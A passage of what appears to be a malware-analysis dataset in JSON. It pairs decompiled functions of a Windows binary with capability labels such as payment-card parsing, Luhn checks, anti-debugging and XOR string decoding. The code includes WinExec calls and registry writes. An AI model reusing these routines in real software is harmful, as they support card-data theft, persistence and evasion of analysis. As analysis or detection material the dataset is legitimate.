(*_sym.imp.MSVCRT.dll_rand)();\n            arg_20h[0x120] = iVar3 % 5;\n            goto code_r0x00403f7e;\n        }\n    }\n    else {\n        iVar3 = iVar3 + -0x11c18;\n        *(arg_18h + 0x874fff8) = *(arg_18h + 0x874fff8) + 1;\n    }\n    arg_20h[0x120] = iVar3;\ncode_r0x00403f7e:\n    var_10ch = 0;\n    puVar5 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_4h = 0x104;\n    *(puVar5 + 2) = 0;\n    uVar2 = fcn.004034c0(0x80000001, 0x407258, 0x407284, &var_8h, &var_10ch, &var_4h);\n    if (uVar2 != 0) {\n        Var7 = (*_sym.imp.MSVCRT.dll__stricmp)(*0x10 + -0x110, 0xd4);\n        uVar2 = Var7;\n        bVar6 = uVar2 == 0;\n        if (bVar6) {\n            puVar4 = arg_20h;\n            if ((!bVar6) && (bVar6)) {\n                uVar2 = *0x4bb148d3;\n                puVar4 = arg_20h + 1;\n                out(*arg_20h, Var7 >> 0x20);\n            }\n            puVar4[0x120] = puVar4[0x120] | 0x80;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 869
    },
    "004022f0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402304) overlaps instruction at (ram,0x00402302)\n// \n\nulong __cdecl fcn.004022f0(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint16_t uVar3;\n    uint32_t in_EAX;\n    int32_t iVar4;\n    uint *unaff_EBX;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint unaff_EDI;\n    bool in_SF;\n    bool bVar8;\n    uint *puStackY28;\n    uint *in_stack_ffffffe8;\n    uint32_t in_stack_ffffffec;\n    \n    if ((in_SF) || (!in_SF)) {\n        in_EAX = arg_ch + 1U >> 1;\n        puStackY28 = NULL;\n        unaff_EBX = arg_8h;\n        in_stack_ffffffe8 = arg_8h;\n        in_stack_ffffffec = in_EAX;\n    }\n    *(in_EAX + 0x8b0c455c) = *(in_EAX + 0x8b0c455c) | in_EAX + 0x8bU;\n    func_0x00aa7661();\n    uVar3 = fcn.00402b60(in_stack_ffffffe8, in_stack_ffffffec, unaff_EDI);\n    iVar4 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    puStackY28[2] = iVar4;\n    uVar1 = *(iVar4 + 0x58);\n    if (uVar3 < uVar1) {\n        iVar4 = puStackY28[2];\n        iVar7 = (uVar3 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        iVar7 = uVar3 - (uVar1 & 0xffff);\n    }\n    uVar3 = uVar1 >> 0x10;\n    bVar8 = SBORROW2(iVar7, uVar3);\n    if (iVar7 < uVar3) {\n        if ((!bVar8) && (bVar8)) {\n            *unaff_EBX = arg_10h;\n            return CONCAT44(arg_8h, arg_10h);\n        }\n        iVar7 = (iVar7 - (uVar1 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar7 = iVar7 - (uVar1 >> 0x10);\n    }\n    iVar7 = iVar7 + puStackY28[3];\n    *puStackY28[5] = iVar7;\n    puVar6 = puStackY28;\n    if ((iVar7 != 0) && (iVar7 == 0)) {\n        puVar5 = &stack0xffffffec;\n        puVar6 = &stack0xffffffec;\n        cVar2 = '\\x10';\n        do {\n            puStackY28 = puStackY28 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puStackY28;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    puVar6 = puVar6[4];\n    *puVar6 = *(iVar4 + 0x58);\n    return CONCAT44(puVar6, iVar4);\n}\n",
        "token_count": 771
    },
    "00402b60": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402be5)\n\nulong __cdecl fcn.00402b60(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint in_EDX;\n    \n    if (arg_10h != 0) {\n        do {\n            arg_8h = arg_8h + *arg_ch;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return CONCAT44(in_EDX, (arg_8h >> 0x10) + arg_8h);\n}\n",
        "token_count": 199
    },
    "00402c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402c20(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402250;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411560;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00402cb0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402cb0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42557c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00405070(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004012e0(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1869
    },
    "00403920": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039d7) overlaps instruction at (ram,0x004039d4)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403920(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t in_EDX;\n    int16_t *unaff_EDI;\n    int16_t *piVar6;\n    uint *puVar7;\n    bool bVar8;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((&stack0xfffffffc < 0xc) || (&stack0xfffffffc >= 0xc)) {\n        unaff_EDI = arg_8h;\n    }\n    piVar6 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    if (*piVar6 != 0x5a4d) {\n        return 0;\n    }\n    piVar1 = *(piVar6 + 0x1e) + piVar6;\n    if (*piVar1 != 0x4550) {\n        return 0;\n    }\n    iVar5 = piVar1[0x16];\n    if (iVar5 == 0) {\n        var_4h = 0x40;\n        bVar8 = SBORROW2(CONCAT11(((piVar1 >> 8) - (&stack0x087d8b72 * 0x10000 >> 0x10)) + 'M', piVar1) & 0x26ae, 1);\n        if (!bVar8) {\n            iVar5 = 0;\n            if (bVar8) {\n                pcVar2 = CONCAT31(piVar1 >> 8, 0x98);\n                *pcVar2 = *pcVar2 + -0x68;\n                *(piVar6 + 9) = *(piVar6 + 9) + ((in_EDX << 0x10) >> 0x18);\n                return 0;\n            }\n        }\n        if (*(piVar6 + 0x1e) < 0x81) {\n            return 0;\n        }\n        uVar3 = *(piVar6 + 0x1e);\n        if (uVar3 < 0xc0) {\n            uVar3 = uVar3 - 0x80;\n            var_4h = uVar3;\n        }\n        *(uVar3 + 0x5639da56) = *(uVar3 + 0x5639da56) ^ iVar5;\n        puVar4 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        if (puVar4 != NULL) {\n            var_ch = 0;\n            if (var_4h != 0) {\n                do {\n                    iVar5 = (*_sym.imp.MSVCRT.dll_rand)();\n                    uVar3 = var_ch + 1;\n                    *(var_ch + puVar4) = iVar5 % 0xff;\n                    piVar6 = arg_8h;\n                    var_ch = uVar3;\n                } while (uVar3 < var_4h);\n            }\n            puVar7 = piVar6 + 0x40;\n            for (uVar3 = var_4h >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 924
    },
    "00404a70": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301",
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301",
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301",
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301",
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301",
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404dc8) overlaps instruction at (ram,0x00404dc6)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00404a70(void)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t arg_14h;\n    ushort extraout_CX;\n    char extraout_CH;\n    uint16_t extraout_CX_00;\n    uint8_t extraout_CH_00;\n    char extraout_CH_01;\n    uint32_t extraout_ECX;\n    uint32_t uVar6;\n    uint extraout_ECX_00;\n    uint8_t extraout_DL;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar7;\n    uint8_t *unaff_EBX;\n    uchar *unaff_EDI;\n    ushort in_SS;\n    bool bVar8;\n    uint8_t uVar9;\n    bool bVar10;\n    char cVar11;\n    uchar uVar12;\n    char cVar13;\n    bool bVar14;\n    uint64_t uVar15;\n    ulong uVar16;\n    uint arg_ch;\n    uint arg_10h;\n    uint uVar17;\n    uint arg_ch_00;\n    uint uVar18;\n    uint arg_10h_00;\n    uint8_t *puVar19;\n    uint32_t uVar20;\n    \n    fcn.00401000(0x411550, 0xd, 0x407010, 0x11);\n    fcn.00401000(0x411550, 0xd, 0x40722c, 0xf);\n    bVar8 = false;\n    bVar10 = (CONCAT11(extraout_CX >> 8 & unaff_EBX >> 8, extraout_CX | unaff_EBX) & unaff_EDI) == 0;\n    fcn.00401000(0x411550, 0xd, 0x40723c, 0x1a);\n    if ((!bVar8 && !bVar10) && (bVar8 || bVar10)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar18 = 0x407290;\n    uVar17 = 0xd;\n    fcn.00401000(0x411550, 0xd, 0x407290, 10);\n    uVar4 = fcn.00401000(0x411550, 0xd, 0x40729c, 0xb);\n    cVar13 = '\\0';\n    cVar11 = (uVar4 ^ 0xca) < '\\0';\n    uVar15 = fcn.00401000(0x411550, 0xd, 0x4072a8, 8);\n    iVar5 = uVar15 >> 0x20;\n    if ((cVar13 == cVar11) && (cVar13 != cVar11)) {\n        iVar5 = uVar15;\n        puVar19 = unaff_EBX;\n        if (uVar15 < 0xb068096a00000000) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    else {\n        puVar19 = 0x9;\n        uVar18 = 0x4072b0;\n        uVar17 = 0xd;\n    }\n    *(iVar5 + 0xd) = *(iVar5 + 0xd) + extraout_CH;\n    fcn.00401000(0x411550, uVar17, uVar18, puVar19);\n    fcn.00401000(0x411550, 0xd, 0x4072bc, 9);\n    uVar12 = (unaff_EBX & extraout_CX_00) < 0;\n    fcn.00401000(0x411550, 0xd, 0x4072c8, 9);\n    uVar17 = 0xc;\n    do {\n        arg_10h_00 = 0x4072d4;\n        arg_ch_00 = 0xd;\n        uVar18 = 0x404be3;\n        iVar5 = fcn.00401000(0x411550, 0xd, 0x4072d4, uVar17);\n        if ((uVar12) || (!uVar12)) {\n            uVar18 = 3;\n        }\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        arg_10h = 0x4072e0;\n        arg_ch = 0xd;\n        fcn.00401000(0x411550, 0xd, 0x4072e0, uVar18);\n        bVar8 = false;\n        uVar12 = 0;\n        bVar10 = (POPCOUNT(extraout_DL & 0x66) & 1U) == 0;\n        uVar17 = fcn.00401000(0x411550, 0xd, 0x4072e4, 10);\n        if ((bVar10) || (!bVar10)) break;\n        segment(in_SS, *0x10 + -0x1c);\n        if (bVar8) goto code_r0x00404c72;\n    } while (bVar10);\n    arg_10h_00 = 0x4072f0;\n    arg_ch_00 = 0xd;\n    fcn.00401000(0x411550, 0xd, 0x4072f0, 0x40);\ncode_r0x00404c72:\n    bVar8 = false;\n    uVar20 = 0x404c91;\n    fcn.00401000(0x411550, 0xd, 0x407330, 0xc);\n    if ((bVar8) || (!bVar8)) {\n        uVar20 = 0xb;\n        arg_10h_00 = 0x40733c;\n        arg_ch_00 = 0xd;\n    }\n    puVar19 = extraout_EDX + 0xd;\n    bVar8 = CARRY1(*puVar19, extraout_CH_00);\n    bVar14 = SCARRY1(*puVar19, extraout_CH_00);\n    *puVar19 = *puVar19 + extraout_CH_00;\n    bVar10 = *puVar19 == 0;\n    uVar16 = fcn.00401000(0x411550, arg_ch_00, arg_10h_00, uVar20);\n    iVar7 = uVar16 >> 0x20;\n    if ((bVar14) || (uVar3 = uVar16 >> 0x20,  !bVar14)) {\n        uVar17 = 4;\n        arg_10h = 0x407348;\n        arg_ch = 0xd;\ncode_r0x00404ce3:\n        *(iVar7 + 0xd) = *(iVar7 + 0xd) + extraout_CH_01;\n        fcn.00401000(0x411550, arg_ch, arg_10h, uVar17);\n        fcn.00401000(0x411550, 0xd, 0x40734c, 4);\n        cVar13 = '\\0';\n        cVar11 = '\\0';\n        uVar20 = 0x404d45;\n        fcn.00401000(0x411550, 0xd, 0x407350, 0xc);\n        uVar6 = extraout_ECX;\n        iVar7 = extraout_EDX_00;\n        if (cVar13 == cVar11) {\n            uVar20 = uVar20 & 0xffff | extraout_ECX << 0x10;\n            goto code_r0x00404d4d;\n        }\n    }\n    else {\n        uVar12 = in(uVar3);\n        *unaff_EDI = uVar12;\n        if (bVar8 || bVar10) {\n            uVar17 = 0x56;\n            if (!bVar8) {\n                *(iVar5 + -0x1bf31e55) = *(iVar5 + -0x1bf31e55) + '\\x04';\n                out(uVar3, 0x4868046a);\n                pcVar2 = swi(1);\n                (*pcVar2)();\n                return;\n            }\n            goto code_r0x00404ce3;\n        }\n        *uVar16 = *uVar16 + uVar16;\n        pcVar1 = iVar5 + -0x1bf31d85;\n        cVar11 = uVar16 >> 8;\n        cVar13 = SCARRY1(*pcVar1, cVar11);\n        *pcVar1 = *pcVar1 + cVar11;\n        cVar11 = *pcVar1 < '\\0';\ncode_r0x00404d4d:\n        uVar6 = uVar20 >> 0x10;\n        uVar4 = uVar20 >> 0x18;\n        if (cVar13 != cVar11) {\n            if (iVar5 + 0x2aU < 0x98) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            goto code_r0x00404d60;\n        }\n    }\n    uVar4 = uVar6 >> 8;\n    uVar20 = 4;\n    arg_10h_00 = 0x40735c;\n    arg_ch_00 = 0xd;\ncode_r0x00404d60:\n    puVar19 = iVar7 + 0xd;\n    uVar9 = CARRY1(*puVar19, uVar4);\n    *puVar19 = *puVar19 + uVar4;\n    bVar8 = *puVar19 < '\\0';\n    uVar16 = fcn.00401000(0x411550, arg_ch_00, arg_10h_00, uVar20);\n    iVar5 = uVar16 >> 0x20;\n    if ((bVar8) || (!bVar8)) {\n        arg_14h = 9;\n        uVar17 = 0x407360;\n        iVar7 = 0xd;\n    }\n    else {\n        arg_14h = uVar16 + 0x68096a2f + uVar9;\n        iVar7 = iVar5;\n        uVar17 = extraout_ECX_00;\n    }\n    pcVar1 = iVar5 + 0xd;\n    *pcVar1 = *pcVar1 + (extraout_ECX_00 >> 8);\n    fcn.00401000(0x411550, iVar7, uVar17, arg_14h);\n    fcn.00401000(0x411550, 0xd, 0x40736c, 0x16);\n    fcn.00401000(0x411550, 0xd, 0x407384, 7);\n    return;\n}\n",
        "token_count": 2485
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00401000(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_1h;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "004010f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401118) overlaps instruction at (ram,0x00401117)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.004010f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint extraout_EDX;\n    int16_t iVar3;\n    uint *unaff_ESI;\n    uint *puVar4;\n    uint *unaff_EDI;\n    uint *puVar5;\n    bool bVar6;\n    uchar var_28h;\n    uint var_27h;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = unaff_ESI + 1;\n    bVar6 = SBORROW2(iVar3, iVar3);\n    if ((!bVar6) && (bVar6)) {\n        *unaff_EDI = *unaff_ESI;\n        return CONCAT44(0x32506653, in_EAX + 1);\n    }\n    var_8h = fcn.00403570(arg_18h, arg_1ch, 0x407054, 7);\n    if (var_8h == NULL) {\n        return 0;\n    }\n    var_28h = 0;\n    puVar4 = &var_27h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    var_4h = 0;\n    do {\n        uVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (&var_28h)[var_4h] = uVar1;\n        var_4h = var_4h + 1;\n    } while (var_4h < 0x20);\n    puVar4 = &var_28h;\n    puVar5 = var_8h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    fcn.00403e90(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h, 0x20, var_8h);\n    fcn.004031a0(arg_18h, arg_1ch);\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 635
    },
    "00401380": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00401380(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pvData;\n    \n    pvData = NULL;\n    iVar2 = fcn.004042b0(&pvData);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (pvData == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = pvData;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, pvData, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 250
    },
    "004019a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a19) overlaps instruction at (ram,0x00401a15)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __cdecl fcn.004019a0(uint arg_8h)\n\n{\n    code **ppcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint8_t extraout_CL;\n    uint extraout_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    int32_t *piVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uchar *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    uchar *puVar18;\n    uint *puVar19;\n    uint *puVar20;\n    uchar *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint *puVar24;\n    uint *puVar25;\n    uint *puVar26;\n    uint *puVar27;\n    uchar *puVar28;\n    uint *puVar29;\n    uint *puVar30;\n    uint *puVar31;\n    uint *puVar32;\n    uchar *puVar33;\n    uint *puVar34;\n    uint *puVar35;\n    uint *puVar36;\n    uint *puVar37;\n    uint *puVar38;\n    uint *puVar39;\n    uint *puVar40;\n    uint *puVar41;\n    uint *puVar42;\n    uchar *puVar43;\n    uint *puVar44;\n    uint *puVar45;\n    uint *puVar46;\n    uint *unaff_ESI;\n    uint *puVar47;\n    uint *in_FS_OFFSET;\n    bool bVar48;\n    bool bVar49;\n    ulong uVar50;\n    uint var_24ch;\n    uint var_147h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint pbstr;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4052e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004019a0::var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    puVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    bVar48 = false;\n    bVar49 = puVar5 == NULL;\n    if (bVar49) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    iVar6 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    if ((bVar48 || bVar49) || (uVar10 = extraout_CL,  !bVar48 && !bVar49)) {\n        uVar10 = 0xe4;\n    }\n    puVar47 = puVar5 + 1;\n    *puVar5 = *unaff_ESI;\n    piVar11 = 0xdf00;\n    *(iVar6 + -4) = 0x8be181d0;\n    *0xf4336a1d = *0xf4336a1d | uVar10;\n    puVar12 = iVar6 + -8;\n    *(iVar6 + -8) = 0x401a26;\n    uVar50 = 